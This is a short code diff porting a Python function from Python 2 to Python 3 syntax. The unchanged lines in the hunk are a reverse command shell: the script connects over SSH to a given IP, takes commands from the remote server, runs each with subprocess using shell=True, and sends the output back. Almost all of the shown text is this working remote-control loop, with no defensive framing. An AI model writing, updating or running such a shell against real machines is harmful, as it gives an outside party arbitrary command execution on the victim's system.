@@ -12,14 +12,14 @@ def command(ip, uname, passwd, command):
     if ssh_session.active:
         ssh_session.send(command)
         #read banner
-        print ssh_session.recv(1024) 
+        print(ssh_session.recv(1024))
         while True:
             #get the command from the SSH server
             command = ssh_session.recv(1024)
             try:
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
-            except Exception, e:
+            except Exception as e:
                 ssh_session.send(str(e))
 
         client.close()
